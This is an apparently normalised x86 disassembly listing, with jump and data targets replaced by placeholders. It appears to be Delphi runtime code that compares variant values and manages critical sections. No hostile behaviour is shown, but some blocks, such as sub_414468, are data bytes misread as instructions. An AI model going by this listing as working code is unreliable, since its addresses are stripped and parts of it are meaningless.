fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_41338c
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4133b8
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_413413
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_411f90
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_411f90
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_407e3c
xor edx edx
call sub_4132ec
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41341a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
sub_413424
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
mov ax [ esi ]
call sub_4130f8
movzx eax ax
mov bl [ eax + rw-data ]
mov ax [ edi ]
call sub_4130f8
movzx eax ax
mov al [ eax + rw-data ]
xor edx edx
mov dl al
xor ecx ecx
mov cl bl
imul ecx ecx 0xb
add ecx rw-data
movzx edx [ ecx + edx ]
cmp edx 0xa
ja r-xdata
call sub_40e4dc
mov al 0x1
jmp [ edx * 4 + jump_table_413475 ]
call sub_40e4dc
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_4131f0
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_413204
jmp r-xdata
mov eax edi
call sub_40f630
push eax
mov eax esi
call sub_40f630
pop edx
call sub_4132ec
jmp r-xdata
mov eax esi
call sub_4100f4
push edx
push eax
mov eax edi
call sub_4100f4
push edx
push eax
call sub_413300
jmp r-xdata
mov eax esi
call sub_410c04
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_410c04
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_41333c
jmp r-xdata
mov eax esi
call sub_411374
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_411374
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_413364
jmp r-xdata
mov eax esi
call sub_4118dc
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_4118dc
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_41338c
jmp r-xdata
mov edx edi
mov eax esi
call sub_4133b8
jmp r-xdata
mov eax edi
call sub_4106f0
and eax 0x7f
push eax
mov eax esi
call sub_4106f0
and eax 0x7f
pop edx
call sub_4132ec
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_41311c
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4135b0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
mov si [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_4131f0
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_4131f0
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_41418c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_413204
mov [ ebp - 0x9 ] al
jmp r-xdata
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
call sub_41418c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_413204
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_40e4dc
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e4dc
jmp r-xdata
mov esi [ ebp - 0x4 ]
mov si [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413749
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f26c
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_41418c
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4138db
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f26c
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413839
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_40f26c
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_413424
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ec78
retn
call sub_40e3ec
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4136bb
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f26c
mov ax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_40e4dc
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_413424
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ec78
retn
call sub_40e3ec
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ec78
retn
call sub_40e3ec
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ec78
retn
call sub_40e3ec
call sub_40e4dc
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413991
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f26c
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ec78
retn
call sub_40e3ec
sub_4139d0
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_4139d0
jmp r-xdata
call sub_413424
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_4139d0
jmp r-xdata
pop edi
pop esi
retn
call sub_4135b0
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_413424
jmp r-xdata
sub_413bbc
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413ce2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_40403c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_40403c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41418c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40403c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042f4
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_4081c0
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4042f4
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031c0
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_40288c
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40424c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413ce9
lea eax [ ebp - 0x208 ]
call sub_403fe8
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4042f4
sub_413d40
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_413d30
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_41418c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_413db4
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_413d30
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_413d30
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414334
sete al
xor eax eax
jmp r-xdata
sub_413e50
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_413e50
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_413e9c
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_413e50
pop ecx
pop edx
retn
sub_413ed8
[ eax + 0x80040de ]
push esi
popad
jb r-xdata
cli
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_41418c
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_41410c
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_413ee8
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_413f49
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_405034
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413f50
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403270
sub_413f98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_41410c
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_41418c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_413fec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414024
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_41410c
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414060
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403624
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4140c3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4140ca
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_414164
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403324
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41418c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414234
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405034
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_414244
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41431a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4142fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_40503c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414304
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031c0
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40424c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407ee0
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_414344
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4143b3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4143ba
retn
call sub_413ee8
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4051fc
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a64
mov eax rw-data
call sub_403fe8
mov eax rw-data
call sub_40ec8c
sub_4143bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41445d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414464
retn
mov eax rw-data
call sub_413e44
mov eax sub_40e98c
mov [ rw-data ] eax
mov eax sub_40e4dc
mov [ rw-data ] eax
mov edx sub_40e3ec
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ec8c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413a38
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40efa0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_411f90
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_4126b8
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_414468
push 0xac0047b6
inc [ eax ]
add [ eax - 0x4a ] ch
inc edi
add [ ebp + 0x680000ff ] ch
mov dh 0x47
add [ esi + 0x680000ff ] ch
mov dh 0x47
add [ edi + 0x680000ff ] ch
mov dh 0x47
add [ eax + 0x680000ff ] dl
mov dh 0x47
add [ ecx + 0x680000ff ] dl
mov dh 0x47
add [ edx + 0x680000ff ] dl
mov dh 0x47
add [ ebx + 0x680000ff ] dl
mov dh 0x47
add [ edi + edi * 8 - 0x49980000 ] dl
inc edi
add [ ebp + 0x680000ff ] dl
mov dh 0x47
add [ esi + 0x680000ff ] dl
mov dh 0x47
add [ edi + 0x680000ff ] dl
mov dh 0x47
add [ eax + 0x680000ff ] bl
mov dh 0x47
add [ ecx + 0x680000ff ] bl
mov dh 0x47
add [ edx + 0x680000ff ] bl
mov dh 0x47
add [ ebx + 0x680000ff ] bl
mov dh 0x47
add [ edi + edi * 8 - 0x49980000 ] bl
inc edi
add [ ebp + 0x680000ff ] bl
mov dh 0x47
add [ esi + 0x680000ff ] bl
mov dh 0x47
add [ edi + 0x680000ff ] bl
mov dh 0x47
add [ eax + 0x680000ff ] al
mov dh 0x47
add [ ecx + 0x680000ff ] al
mov dh 0x47
add [ edx + 0x680000ff ] al
mov dh 0x47
add [ ebx + 0x680000ff ] al
mov dh 0x47
add [ edi + edi * 8 - 0x49980000 ] al
inc edi
add [ ebp + 0x680000ff ] al
mov dh 0x47
add [ esi + 0x680000ff ] al
mov dh 0x47
add [ edi + 0x680000ff ] al
mov dh 0x47
add [ eax + 0x680000ff ] cl
mov dh 0x47
add [ ecx + 0x550000ff ] cl
mov ebp esp
xor eax eax
push ebp
push sub_41457d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414584
retn
sub_4145c8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414686
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_4145bc
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_4145bc
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_4080ac
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_40403c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_407ee0
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41468d
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407e00
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40403c
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_40424c
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_4146a0
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4146ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4145bc
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_4081e8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4146a0
mov edx [ rw-data ]
mov eax esi
call sub_407ee0
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407ee0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_4081e8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414750
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_4147c0
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_414814
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
